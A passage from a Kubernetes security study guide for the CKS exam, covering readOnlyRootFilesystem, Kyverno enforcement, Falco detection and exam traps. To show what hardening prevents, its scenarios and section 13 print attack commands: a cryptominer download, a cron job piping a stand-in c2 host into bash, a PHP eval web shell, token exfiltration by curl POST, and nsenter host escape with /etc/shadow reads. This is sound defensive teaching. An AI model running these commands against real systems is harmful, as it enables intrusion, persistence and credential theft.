**Phase 1 — Audit (Week 1-2):**
```bash
# Find all containers without readOnlyRootFilesystem
kubectl get pods --all-namespaces -o json | jq '
  [.items[] |
   select(.spec.containers[].securityContext.readOnlyRootFilesystem != true) |
   {namespace: .metadata.namespace, pod: .metadata.name}]
  | unique'
```

**Phase 2 — Enable in Warn/Audit mode (Week 3-4):**
```yaml
# Kyverno in Audit mode — log violations but don't block
spec:
  validationFailureAction: Audit   # Not Enforce yet
```

**Phase 3 — Fix applications one namespace at a time (Month 2-3):**
For each application:
1. Run `kubectl exec` and identify which paths need write access
2. Add emptyDir volume mounts
3. Test that the application starts and functions correctly
4. Merge to GitOps repo

**Phase 4 — Enable enforcement (Month 4):**
```yaml
spec:
  validationFailureAction: Enforce  # Now blocks non-compliant pods
```

### 11.2 The Security Context Standard (Team Template)

Define a security context standard for your organisation:

```yaml
# Minimum security context for all containers
# (embedded in Helm chart defaults, Kustomize bases, etc.)
securityContext:
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  privileged: false
  runAsNonRoot: true
  capabilities:
    drop: [ALL]
```

Any team deploying to the cluster copies this template into their deployment spec. Any deviation requires security team approval and documented justification.

### 11.3 Falco + readOnlyRootFilesystem — The Detection + Prevention Stack

These two controls are complementary:

```
readOnlyRootFilesystem: true
  → PREVENTS the attacker from writing to the container FS
  → First line of defence

Falco (monitoring syscalls)
  → DETECTS the write attempt (even though it fails)
  → Shows that something tried to write
  → Alert: "EROFS: Write attempt to read-only filesystem from process X in container Y"
  → Even a failed attack attempt is valuable intelligence
```

Together, they form a defence-in-depth stack where prevention blocks the attack AND detection records the attempt for forensic analysis.

### 11.4 Communicating to Developers

When developers encounter `EROFS` errors after you enforce `readOnlyRootFilesystem`:

```
Developer: "My pod keeps crashing with 'Read-only file system'"
Security: "Which paths does your app write to at startup?"
Developer: "Just /tmp for temp files and /var/log for logs"
Security: "Here's the fix — add these emptyDir volume mounts:"

[Provide the YAML snippet — don't just say "fix your security context"]
```

Make it easy for developers to comply. Provide templates, examples, and tooling that auto-detects required write paths.

---

## 12. Real Present-Day Scenarios

### Scenario 1: Cryptominer Blocked by readOnlyRootFilesystem

A vulnerability in a popular web framework allows remote code execution. The attacker's payload:
```bash
curl http://attacker.io/xmrig -o /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig
```

**Without readOnlyRootFilesystem:**
- `curl` downloads to `/tmp` (writable) → success
- `chmod` makes it executable → success
- `/tmp/xmrig` runs → cryptominer active

**With readOnlyRootFilesystem: true and no /tmp volume:**
- `curl` tries to write to `/tmp` → EROFS error → fails
- Attack chain broken at first step
- Falco alerts on the `curl` execution AND the write failure
- Zero mining before detection

**With readOnlyRootFilesystem: true and emptyDir at /tmp:**
- `curl` downloads to `/tmp` (emptyDir — writable) → success
- `chmod` → success
- `/tmp/xmrig` executes → Falco IMMEDIATELY detects `xmrig` execution → CRITICAL alert
- The emptyDir write didn't help the attacker because Falco caught the execution
- Pod killed within seconds of alert

This is the defence-in-depth result: `readOnlyRootFilesystem` + carefully-bounded `emptyDir` + Falco monitoring = attack breaks or gets detected immediately.

### Scenario 2: A Bank Enforces Immutability for PCI DSS

A retail bank running 500 Kubernetes pods across 3 clusters must demonstrate to PCI DSS auditors that production containers cannot be modified at runtime (Requirement 6.3: "Protect web-facing applications against known attacks").

**Evidence gathered:**
```bash
# 1. All production pods have readOnlyRootFilesystem: true
kubectl get pods -n production -o json | \
  jq '[.items[] | .spec.containers[].securityContext.readOnlyRootFilesystem] | all'
# Output: true

# 2. Kyverno policy enforces it at admission
kubectl get clusterpolicy require-readonly-rootfs -o yaml

# 3. Falco monitors and alerts on any write attempt
kubectl logs -n falco falco-pod | grep "Read-only" | wc -l
# 0 write attempts in the last 30 days

# 4. Privileged containers are blocked
kubectl get clusterpolicy disallow-privileged
```

The auditor accepts this as evidence of runtime immutability. The bank passes the PCI DSS requirement.

### Scenario 3: Developer Accidentally Finds a Break-Glass Use Case

A production system has a critical configuration error — the wrong API key is baked into the image. The system is causing downstream failures. The developer wants to quickly patch the config without rebuilding the image.

**The problem:** `readOnlyRootFilesystem: true` prevents the "quick fix" of execing in and editing the config file.

**The correct response (from security team):**
1. Update the ConfigMap/Secret containing the API key → Kubernetes mounts updated value (this works even with read-only FS because ConfigMap/Secret volumes are managed by Kubernetes, not the container)
2. Trigger a rolling restart: `kubectl rollout restart deployment/api`
3. New pods pick up the new ConfigMap value

This is an important insight: **ConfigMaps and Secrets mounted as volumes update without the container needing a writable filesystem** — Kubernetes manages these updates outside the container filesystem layer.

### Scenario 4: Security Audit Catches Missing Immutability in Staging

A company uses automated security scanning on all Kubernetes manifests in their GitOps repository. A scan reveals that 23 Deployments in the staging namespace lack `readOnlyRootFilesystem: true`. The security team generates a remediation PR automatically:

```python
# Automated remediation script (runs in CI)
import yaml, glob, os

for filepath in glob.glob("k8s/**/*.yaml", recursive=True):
    with open(filepath) as f:
        manifest = yaml.safe_load(f)
    
    if manifest.get("kind") == "Deployment":
        for container in manifest["spec"]["template"]["spec"]["containers"]:
            if "securityContext" not in container:
                container["securityContext"] = {}
            if not container["securityContext"].get("readOnlyRootFilesystem"):
                container["securityContext"]["readOnlyRootFilesystem"] = True
                # Add required emptyDir volumes
                # ... (add /tmp emptyDir)
    
    with open(filepath, "w") as f:
        yaml.dump(manifest, f)
```

23 manifests updated, tested in CI, PR created, reviewed, merged. All staging workloads now compliant.

---

## 13. What Happens If You Don't Follow This

### No `readOnlyRootFilesystem`

```bash
# Attacker in your mutable container:
kubectl exec -it compromised-pod -- bash

# Install lateral movement tools
apt-get install -y nmap ncat curl wget

# Install persistence
echo '*/5 * * * * curl http://c2.attacker.io/check | bash' >> /etc/crontab

# Modify application logic
echo 'eval($_POST["cmd"]);' >> /app/index.php

# Stage exfiltration
find /var/run/secrets -name "token" -exec cp {} /tmp/tokens/ \;
curl -X POST http://c2.attacker.io/data -d @/tmp/tokens/token
```

All of the above is possible in a mutable container. With `readOnlyRootFilesystem: true`, every single step fails.

### `privileged: true` Without Justification

```bash
# In a privileged container, an attacker can:
# 1. Escape to the host
nsenter -t 1 --mount --pid --uts --ipc --net bash
# Now running on the HOST as root

# 2. Access all other containers on the node
ls /proc/*/root/etc/   # Browse filesystem of every process

# 3. Mount host disk
mount /dev/sda1 /mnt
cat /mnt/etc/shadow    # Read host password file

# 4. Load kernel modules
insmod /path/to/rootkit.ko
```

`privileged: true` without necessity is a complete container escape.

### Forgetting Volume Mounts for Required Paths

```bash
# Without emptyDir volumes for /var/cache/nginx and /var/run:
kubectl get pods
NAME    READY   STATUS             RESTARTS   AGE
nginx   0/1     CrashLoopBackOff   5          2m

# The pod never starts. readOnlyRootFilesystem: true without
# appropriate volume mounts = unavailable application.
# Balance security with application requirements.
```

### Not Enforcing with Policy

```yaml
# Without Kyverno/OPA enforcement:
# Developer deploys:
spec:
  containers:
  - name: app
    image: myapp:1.0
    # No securityContext at all — completely mutable
    # Nothing stops this from reaching production
```

Convention without enforcement means any developer who forgets, is new, or intentionally ignores the policy can deploy a fully mutable container to production. Policy engines convert a convention into a technical control.

---

## 14. Most Common Commands and Syntax

### Checking Immutability Settings

```bash
# Check readOnlyRootFilesystem for a specific pod
kubectl get pod nginx -o jsonpath='{.spec.containers[0].securityContext.readOnlyRootFilesystem}'

# Check all containers in all pods in a namespace
kubectl get pods -n production -o json | \
  jq '.items[] | {pod: .metadata.name, containers: [.spec.containers[] |
    {name: .name, readonly: .securityContext.readOnlyRootFilesystem}]}'

# Find all pods WITHOUT readOnlyRootFilesystem: true
kubectl get pods --all-namespaces -o json | jq '
  .items[] |
  select(.spec.containers[].securityContext.readOnlyRootFilesystem != true) |
  "\(.metadata.namespace)/\(.metadata.name)"'

# Find privileged containers
kubectl get pods --all-namespaces -o json | jq '
  .items[] |
  select(.spec.containers[].securityContext.privileged == true) |
  "\(.metadata.namespace)/\(.metadata.name)"'
```

### Testing Immutability

```bash
# Test that read-only FS is enforced
kubectl exec -ti nginx -- touch /test-write
# Expected: touch: cannot touch '/test-write': Read-only file system

# Verify emptyDir volumes are writable
kubectl exec -ti nginx -- touch /var/cache/nginx/test
# Expected: (no error — emptyDir is writable)

# Test apt update fails (from KodeKloud)
kubectl exec -ti nginx -- apt update
# Expected: E: List directory /var/lib/apt/lists/partial is missing. - Acquire (30: Read-only file system)

# Verify reads still work
kubectl exec -ti nginx -- cat /etc/nginx/nginx.conf
# Expected: (shows nginx config — reads still allowed)
```

### Full Immutable Pod YAML (Quick Reference)

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
  containers:
  - name: app
    image: myapp:1.0
    securityContext:
      readOnlyRootFilesystem: true       # ← Immutability
      allowPrivilegeEscalation: false    # ← No privilege gain
      privileged: false                  # ← No privileged mode
      capabilities:
        drop: [ALL]                      # ← No capabilities
    volumeMounts:
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: tmp
    emptyDir: {}
```

### Best Practices Summary (From KodeKloud Table)

| Control | YAML Field | Purpose |
|---|---|---|
| Read-Only Root FS | `securityContext.readOnlyRootFilesystem: true` | Prevent runtime FS modification |
| Limited Write Volumes | `volumeMounts` + `volumes.emptyDir` | Allow app writes to specific paths only |
| Avoid Privileged | `securityContext.privileged: false` | Prevent host kernel modification |
| Non-Root Containers | `securityContext.runAsNonRoot: true` | Minimise damage if compromised |
| Enforce Policies | Kyverno / OPA Gatekeeper / PSS | Fleet-wide automated enforcement |

---

## 15. Other Tools and Services Available

### 15.1 Runtime Security Scanning

| Tool | Purpose | Key Feature |
|---|---|---|
| **kube-bench** | CIS benchmark scanning | Checks pod security context settings |
| **Kubescape** | NSA/CISA framework scanning | Identifies mutable containers |
| **Trivy** | Misconfiguration scanning | `trivy k8s` scans running cluster |
| **Polaris** | Manifest best practice checking | Built-in immutability checks |
| **Datree** | CI/CD policy enforcement | Pre-commit checks for readOnlyRootFilesystem |

### 15.2 Automatic Security Context Injection

**Kyverno Mutate — Auto-inject security context:**
```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: add-readonly-rootfs
spec:
  rules:
  - name: add-readonly
    match:
      resources:
        kinds: [Pod]
    mutate:
      foreach:
      - list: request.object.spec.containers
        patchStrategicMerge:
          spec:
            containers:
            - (name): "{{ element.name }}"
              securityContext:
                readOnlyRootFilesystem: true    # Auto-inject if missing
```

This mutating webhook adds `readOnlyRootFilesystem: true` automatically to any pod that doesn't set it — developers don't even need to think about it.

### 15.3 seccomp Profiles (Complementary Control)

seccomp (Secure Computing Mode) provides a complementary layer: it restricts which syscalls the container can make. Combined with `readOnlyRootFilesystem`:

```yaml
securityContext:
  readOnlyRootFilesystem: true     # Can't write to FS
  seccompProfile:
    type: RuntimeDefault           # Can't make dangerous syscalls
```

The `RuntimeDefault` seccomp profile blocks ~40% of all Linux syscalls that containers almost never need but attackers commonly use.

### 15.4 AppArmor and SELinux

Additional kernel-level MAC (Mandatory Access Control) systems that can restrict file write operations even more granularly:

```yaml
# AppArmor annotation
metadata:
  annotations:
    container.apparmor.security.beta.kubernetes.io/nginx: runtime/default

# SELinux labels (for SELinux-enabled clusters)
securityContext:
  seLinuxOptions:
    level: "s0:c123,c456"
```

---

## 16. How AI Is Impacting This Area

### 16.1 AI-Powered Write Path Discovery

Before enforcing `readOnlyRootFilesystem: true`, you need to know which paths an application writes to. AI can automate this discovery:

```
Input: Docker image name or Dockerfile
AI analysis:
  1. Builds the image
  2. Runs the container with strace/eBPF monitoring
  3. Records all write() syscalls during startup and operation
  4. Produces a report:
     "This image requires write access to: /tmp, /var/cache/nginx, /var/run
      Suggested emptyDir volumes: [generated YAML snippet]"
```

This eliminates the trial-and-error of discovering write requirements the hard way (pod crash → check logs → add volume → repeat).

### 16.2 AI Security Context Generation

LLMs can generate appropriate security contexts for any application:

```
User: "Generate a security context for a Spring Boot application 
       that needs write access to /tmp and /var/log"

Claude generates:
securityContext:
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  runAsNonRoot: true
  runAsUser: 1000
  capabilities:
    drop: [ALL]
volumeMounts:
- name: tmp
  mountPath: /tmp
- name: logs
  mountPath: /var/log/app
volumes:
- name: tmp
  emptyDir: {sizeLimit: 100Mi}
- name: logs
  emptyDir: {sizeLimit: 500Mi}
```

### 16.3 AI-Driven Compliance Drift Detection

Continuous AI analysis across all running pods detects when immutability settings have changed:

```
Monday:  Pod nginx-7d8b9c → readOnlyRootFilesystem: true  ✓
Tuesday: Pod nginx-7d8b9c → readOnlyRootFilesystem: true  ✓
Wednesday drift detected:
  Pod nginx-7d8b9c → readOnlyRootFilesystem: false ← DRIFT!
  
AI alert: "Pod nginx-7d8b9c in namespace production no longer has 
           readOnlyRootFilesystem enabled. This occurred after a 
           manual kubectl edit at 14:32 by user john.doe. 
           Recommended action: Revert the edit and investigate why 
           the security control was removed."
```

### 16.4 Automatic Remediation

AI + GitOps can automatically fix immutability misconfigurations:

```
AI detects: Deployment "api" missing readOnlyRootFilesystem
→ AI generates fix (adds field + emptyDir volumes for /tmp)
→ AI opens PR in GitOps repo with explanation
→ Human reviews and approves (5 second review for obvious fix)
→ ArgoCD applies → pod recreated with immutability enforced
Total time: < 10 minutes from detection to fix
```

---

## 17. CKS Exam Tips

This chapter is extremely heavily tested in the CKS. The practical skills here — configuring `readOnlyRootFilesystem`, adding emptyDir volumes, understanding privileged mode — appear in multiple exam questions.

### What the Exam Tests

| Competency | Exam Frequency |
|---|---|
| Add `readOnlyRootFilesystem: true` to a pod/deployment | Very High |
| Fix a pod that crashes after readOnlyRootFilesystem is set (add emptyDir volumes) | Very High |
| Explain why a container fails to start (EROFS error) | High |
| Understand that privileged mode does NOT override readOnlyRootFilesystem | High |
| Know that custom write paths need emptyDir volumes | High |
| Apply Pod Security Standards to a namespace | Medium |
| Know PSP is deprecated and what replaces it | Medium |

### The Canonical CKS Exam Pattern

**Exam task:** "Pod `nginx` is failing. Configure it to use a read-only root filesystem while ensuring it continues to function."

```bash
# Step 1: Check why it's failing
kubectl get pod nginx
# NAME    READY   STATUS    RESTARTS
# nginx   0/1     Error     3

kubectl logs nginx
# mkdir() "/var/cache/nginx/client_temp" failed (30: Read-only file system)

# Step 2: Now you know the problem — readOnlyRootFilesystem is set but no volumes

# Step 3: Edit the pod/deployment
kubectl get pod nginx -o yaml > nginx.yaml
vi nginx.yaml

# Step 4: Add emptyDir volumes for the failing paths
# (from the log: /var/cache/nginx needs write access)
# Also add /var/run for the PID file

# Step 5: Apply
kubectl delete pod nginx
kubectl apply -f nginx.yaml

# Step 6: Verify
kubectl get pods
# nginx   1/1     Running   0
```

### The Five Things You Must Know Cold

```yaml
# 1. The field name and location
securityContext:
  readOnlyRootFilesystem: true    # CONTAINER-level (not pod-level)

# 2. The volume fix for Nginx
volumeMounts:
- name: cache-volume
  mountPath: /var/cache/nginx
- name: runtime-volume
  mountPath: /var/run
volumes:
- name: cache-volume
  emptyDir: {}
- name: runtime-volume
  emptyDir: {}

# 3. The test command (verify it works)
kubectl exec -ti nginx -- apt update
# Must return: "Read-only file system" error

# 4. The apt update failure message from KodeKloud (may appear in exam questions)
# "E: List directory /var/lib/apt/lists/partial is missing. - Acquire (30: Read-only file system)"

# 5. That privileged: true does NOT override readOnlyRootFilesystem: true
```

### Exam Traps

**Trap 1: Putting `readOnlyRootFilesystem` at the pod level**
```yaml
# WRONG — doesn't work at pod level
spec:
  securityContext:
    readOnlyRootFilesystem: true    # ← Pod securityContext doesn't support this

# RIGHT — must be at container level
spec:
  containers:
  - securityContext:
      readOnlyRootFilesystem: true  # ← Container securityContext
```

**Trap 2: Forgetting that the pod crashes without volume mounts**
→ Always check if Nginx (or any app) needs `/var/cache/nginx` and `/var/run` writable
→ Check `kubectl logs <pod>` for EROFS errors to identify missing write paths

**Trap 3: Thinking `privileged: true` bypasses `readOnlyRootFilesystem`**
→ It does NOT. The exam may specifically test this understanding.
→ `apt update` still fails even in a privileged container with `readOnlyRootFilesystem: true`

**Trap 4: Using PSP (removed in K8s 1.25)**
→ Don't write `apiVersion: policy/v1beta1 kind: PodSecurityPolicy` in the exam
→ Use PSS namespace labels or Kyverno policies instead

**Trap 5: Not applying the fix to the Deployment (only fixing the pod)**
→ If the task says "ensure the Deployment uses a read-only filesystem", edit the Deployment, not a standalone pod
→ `kubectl edit deployment nginx` then add securityContext + volumes to the pod template

### Security Controls Quick Reference

| Control | YAML | Prevents |
|---|---|---|
| `readOnlyRootFilesystem: true` | Container securityContext | Writing to container FS |
| `privileged: false` | Container securityContext | Host kernel access, device access |
| `allowPrivilegeEscalation: false` | Container securityContext | Gaining more privileges than parent |
| `runAsNonRoot: true` | Pod or Container securityContext | Running as UID 0 |
| `capabilities.drop: [ALL]` | Container securityContext | Linux capability abuse |
| `emptyDir: {}` | volumes + volumeMounts | App not starting due to read-only FS |

---

## 18. Links and References

- [Kubernetes Pod Security Context Reference](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [readOnlyRootFilesystem API Reference](https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.30/#securitycontext-v1-core)
- [emptyDir Volumes Documentation](https://kubernetes.io/docs/concepts/storage/volumes/#emptydir)
- [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [Kubernetes Security Context Best Practices](https://kubernetes.io/docs/concepts/security/pod-security-policy/)
- [Kyverno Policies Library](https://kyverno.io/policies/)
- [OPA Gatekeeper Policy Library](https://open-policy-agent.github.io/gatekeeper-library/website/)
- [NSA/CISA Kubernetes Hardening Guide](https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF)
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
- [NIST SP 800-190 Container Security Guide](https://csrc.nist.gov/publications/detail/sp/800-190/final)
- [Falco Rules for Container Immutability](https://github.com/falcosecurity/rules)

---

*Chapter 6 of 6 — Monitoring, Logging and Runtime Security*
*Module Complete — Final file remaining: 0 -- Intro - Monitoring, Logging and Runtime Security.md*
